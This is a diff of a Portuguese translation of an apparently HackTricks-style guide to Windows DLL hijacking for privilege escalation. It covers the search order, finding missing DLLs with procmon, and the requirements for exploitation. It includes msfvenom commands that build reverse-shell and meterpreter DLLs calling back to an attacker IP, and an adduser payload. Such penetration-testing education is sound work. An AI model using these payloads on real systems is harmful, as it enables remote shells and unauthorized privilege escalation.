@@ -23,22 +23,22 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Basic Information
 
-DLL Hijacking envolve manipular um aplicativo confiável para carregar um DLL malicioso. Este termo abrange várias táticas como **DLL Spoofing, Injection, e Side-Loading**. É utilizado principalmente para execução de código, alcançando persistência e, menos comumente, escalonamento de privilégios. Apesar do foco no escalonamento aqui, o método de hijacking permanece consistente entre os objetivos.
+DLL Hijacking envolve manipular um aplicativo confiável para carregar uma DLL maliciosa. Este termo abrange várias táticas como **DLL Spoofing, Injection, e Side-Loading**. É utilizado principalmente para execução de código, alcançando persistência e, menos comumente, escalonamento de privilégios. Apesar do foco no escalonamento aqui, o método de hijacking permanece consistente entre os objetivos.
 
 ### Common Techniques
 
 Vários métodos são empregados para DLL hijacking, cada um com sua eficácia dependendo da estratégia de carregamento de DLL do aplicativo:
 
-1. **DLL Replacement**: Trocar um DLL genuíno por um malicioso, opcionalmente usando DLL Proxying para preservar a funcionalidade do DLL original.
-2. **DLL Search Order Hijacking**: Colocar o DLL malicioso em um caminho de busca à frente do legítimo, explorando o padrão de busca do aplicativo.
-3. **Phantom DLL Hijacking**: Criar um DLL malicioso para um aplicativo carregar, pensando que é um DLL requerido que não existe.
-4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar o aplicativo ao DLL malicioso.
-5. **WinSxS DLL Replacement**: Substituir o DLL legítimo por um malicioso no diretório WinSxS, um método frequentemente associado ao side-loading de DLL.
-6. **Relative Path DLL Hijacking**: Colocar o DLL malicioso em um diretório controlado pelo usuário com o aplicativo copiado, semelhante às técnicas de Binary Proxy Execution.
+1. **DLL Replacement**: Trocar uma DLL genuína por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
+2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de busca à frente da legítima, explorando o padrão de busca do aplicativo.
+3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para um aplicativo carregar, pensando que é uma DLL necessária que não existe.
+4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar o aplicativo para a DLL maliciosa.
+5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma maliciosa no diretório WinSxS, um método frequentemente associado ao side-loading de DLL.
+6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário com o aplicativo copiado, semelhante às técnicas de Binary Proxy Execution.
 
 ## Finding missing Dlls
 
-A maneira mais comum de encontrar Dlls ausentes em um sistema é executando [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **definindo** os **seguintes 2 filtros**:
+A maneira mais comum de encontrar DLLs ausentes em um sistema é executar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **definindo** os **seguintes 2 filtros**:
 
 ![](<../../../.gitbook/assets/image (961).png>)
 
@@ -49,17 +49,17 @@ e apenas mostrar a **Atividade do Sistema de Arquivos**:
 ![](<../../../.gitbook/assets/image (153).png>)
 
 Se você está procurando por **dlls ausentes em geral**, você **deixa** isso rodando por alguns **segundos**.\
-Se você está procurando por um **dll ausente dentro de um executável específico**, você deve definir **outro filtro como "Process Name" "contains" "\<exec name>", executá-lo e parar de capturar eventos**.
+Se você está procurando por uma **dll ausente dentro de um executável específico**, você deve definir **outro filtro como "Process Name" "contains" "\<exec name>", executá-lo e parar de capturar eventos**.
 
 ## Exploiting Missing Dlls
 
-Para escalar privilégios, a melhor chance que temos é ser capaz de **escrever um dll que um processo privilegiado tentará carregar** em algum **lugar onde será pesquisado**. Portanto, seremos capazes de **escrever** um dll em uma **pasta** onde o **dll é pesquisado antes** da pasta onde o **dll original** está (caso estranho), ou seremos capazes de **escrever em alguma pasta onde o dll será pesquisado** e o **dll original não existe** em nenhuma pasta.
+Para escalar privilégios, a melhor chance que temos é ser capaz de **escrever uma dll que um processo privilegiado tentará carregar** em algum **lugar onde será pesquisada**. Portanto, seremos capazes de **escrever** uma dll em uma **pasta** onde a **dll é pesquisada antes** da pasta onde a **dll original** está (caso estranho), ou seremos capazes de **escrever em alguma pasta onde a dll será pesquisada** e a **dll original não existe** em nenhuma pasta.
 
 ### Dll Search Order
 
-**Dentro da** [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **você pode encontrar como os Dlls são carregados especificamente.**
+**Dentro da** [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **você pode encontrar como as DLLs são carregadas especificamente.**
 
-**Aplicativos do Windows** procuram por DLLs seguindo um conjunto de **caminhos de busca pré-definidos**, aderindo a uma sequência particular. O problema do DLL hijacking surge quando um DLL prejudicial é colocado estrategicamente em um desses diretórios, garantindo que ele seja carregado antes do DLL autêntico. Uma solução para prevenir isso é garantir que o aplicativo use caminhos absolutos ao se referir aos DLLs que requer.
+**Aplicativos do Windows** procuram por DLLs seguindo um conjunto de **caminhos de busca pré-definidos**, aderindo a uma sequência particular. O problema do DLL hijacking surge quando uma DLL prejudicial é estrategicamente colocada em um desses diretórios, garantindo que ela seja carregada antes da DLL autêntica. Uma solução para prevenir isso é garantir que o aplicativo use caminhos absolutos ao se referir às DLLs que requer.
 
 Você pode ver a **ordem de busca de DLL em sistemas de 32 bits** abaixo:
 
@@ -69,13 +69,13 @@ Você pode ver a **ordem de busca de DLL em sistemas de 32 bits** abaixo:
 4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho deste diretório.
 1. (_C:\Windows_)
 5. O diretório atual.
-6. Os diretórios listados na variável de ambiente PATH. Note que isso não inclui o caminho por aplicativo especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de busca do DLL.
+6. Os diretórios listados na variável de ambiente PATH. Note que isso não inclui o caminho por aplicativo especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de busca da DLL.
 
 Essa é a **ordem de busca padrão** com **SafeDllSearchMode** habilitado. Quando desabilitado, o diretório atual sobe para o segundo lugar. Para desativar esse recurso, crie o valor de registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).
 
 Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.
 
-Finalmente, note que **um dll pode ser carregado indicando o caminho absoluto em vez apenas o nome**. Nesse caso, esse dll **será pesquisado apenas nesse caminho** (se o dll tiver dependências, elas serão pesquisadas como se fossem carregadas apenas pelo nome).
+Finalmente, note que **uma dll pode ser carregada indicando o caminho absoluto em vez de apenas o nome**. Nesse caso, essa dll **será pesquisada apenas nesse caminho** (se a dll tiver dependências, elas serão pesquisadas como se fossem carregadas apenas pelo nome).
 
 Existem outras maneiras de alterar a ordem de busca, mas não vou explicá-las aqui.
 
@@ -83,19 +83,19 @@ Existem outras maneiras de alterar a ordem de busca, mas não vou explicá-las a
 
 Certas exceções à ordem padrão de busca de DLL são notadas na documentação do Windows:
 
-* Quando um **DLL que compartilha seu nome com um já carregado na memória** é encontrado, o sistema ignora a busca usual. Em vez disso, ele realiza uma verificação de redirecionamento e um manifesto antes de retornar ao DLL já na memória. **Nesse cenário, o sistema não realiza uma busca pelo DLL**.
-* Em casos onde o DLL é reconhecido como um **DLL conhecido** para a versão atual do Windows, o sistema utilizará sua versão do DLL conhecido, junto com quaisquer de seus DLLs dependentes, **abrindo mão do processo de busca**. A chave de registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista desses DLLs conhecidos.
-* Se um **DLL tiver dependências**, a busca por esses DLLs dependentes é realizada como se fossem indicados apenas por seus **nomes de módulo**, independentemente de o DLL inicial ter sido identificado através de um caminho completo.
+* Quando uma **DLL que compartilha seu nome com uma já carregada na memória** é encontrada, o sistema ignora a busca usual. Em vez disso, ele realiza uma verificação de redirecionamento e um manifesto antes de recorrer à DLL já na memória. **Nesse cenário, o sistema não realiza uma busca pela DLL**.
+* Em casos onde a DLL é reconhecida como uma **DLL conhecida** para a versão atual do Windows, o sistema utilizará sua versão da DLL conhecida, juntamente com quaisquer de suas DLLs dependentes, **abrindo mão do processo de busca**. A chave de registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista dessas DLLs conhecidas.
+* Se uma **DLL tiver dependências**, a busca por essas DLLs dependentes é realizada como se fossem indicadas apenas por seus **nomes de módulo**, independentemente de a DLL inicial ter sido identificada através de um caminho completo.
 
 ### Escalating Privileges
 
 **Requisitos**:
 
-* Identificar um processo que opera ou operará sob **diferentes privilégios** (movimento horizontal ou lateral), que está **faltando um DLL**.
-* Garantir que o **acesso de escrita** esteja disponível para qualquer **diretório** no qual o **DLL** será **pesquisado**. Este local pode ser o diretório do executável ou um diretório dentro do caminho do sistema.
+* Identificar um processo que opera ou operará sob **diferentes privilégios** (movimento horizontal ou lateral), que está **faltando uma DLL**.
+* Garantir que o **acesso de gravação** esteja disponível para qualquer **diretório** no qual a **DLL** será **pesquisada**. Este local pode ser o diretório do executável ou um diretório dentro do caminho do sistema.
 
-Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado faltando um dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do caminho do sistema** (você não pode por padrão). Mas, em ambientes mal configurados, isso é possível.\
-No caso de você ter sorte e se encontrar atendendo aos requisitos, você pode verificar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja contornar o UAC**, você pode encontrar lá um **PoC** de um Dll hijacking para a versão do Windows que você pode usar (provavelmente apenas mudando o caminho da pasta onde você tem permissões de escrita).
+Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado faltando uma dll** e é ainda **mais estranho ter permissões de gravação em uma pasta do caminho do sistema** (você não pode por padrão). Mas, em ambientes mal configurados, isso é possível.\
+No caso de você ter sorte e se encontrar atendendo aos requisitos, você pode verificar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja contornar o UAC**, você pode encontrar lá uma **PoC** de um Dll hijacking para a versão do Windows que você pode usar (provavelmente apenas mudando o caminho da pasta onde você tem permissões de gravação).
 
 Note que você pode **verificar suas permissões em uma pasta** fazendo:
 ```bash
@@ -129,7 +129,7 @@ Além disso, na **próxima seção** você pode encontrar alguns **códigos dll 
 
 ## **Criando e compilando Dlls**
 
-### **Dll Proxifying**
+### **Dll Proxificando**
 
 Basicamente, um **Dll proxy** é um Dll capaz de **executar seu código malicioso quando carregado**, mas também de **expor** e **funcionar** como **esperado** ao **revezar todas as chamadas para a biblioteca real**.
 
@@ -145,7 +145,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Criar um usuário (x86, eu não vi uma versão x64):**
+**Criar um usuário (x86, não vi uma versão x64):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
